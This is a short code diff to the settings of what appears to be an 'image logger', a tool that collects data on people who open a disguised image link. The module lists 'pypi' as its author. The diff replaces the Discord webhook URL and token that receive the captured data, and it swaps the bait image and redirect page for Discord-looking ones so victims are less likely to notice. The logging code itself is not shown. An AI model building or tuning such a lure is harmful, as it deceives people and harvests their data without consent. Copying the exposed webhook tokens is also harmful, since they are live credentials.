@@ -12,8 +12,8 @@ __author__ = "pypi"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1178175193894637580/1b2LwmUn0VntfKkph6M3hzFDUr8f9o1wSja8NXfepSqi8Rf2h0USwTJ8o3ELgN79D_Xg",
-    "image": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Pink_lady_and_cross_section.jpg/220px-Pink_lady_and_cross_section.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1267533740612128892/iMVhAYVhhwMvsVq0q94EJCMNSqKj-gcNKgIdj-VsNhV95Ju2ZY1QQd9WxzkA_9hUgYM7",
+    "image": "https://images-ext-1.discordapp.net/external/6kX4_SJEceTLMiHCh2hdZpibT_xzN-Zu5gmfrn_uRJ4/%3Ftext%3Dsigh/https/api.popcat.xyz/alert", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
@@ -51,7 +51,7 @@ config = {
     # REDIRECTION #
     "redirect": {
         "redirect": True, # Redirect to a webpage?
-        "page": "https://en.wikipedia.org/wiki/Apple" # Link to the webpage to redirect to 
+        "page": "https://discord.com/app" # Link to the webpage to redirect to 
     },
 
     # Please enter all values in correct format. Otherwise, it may break.
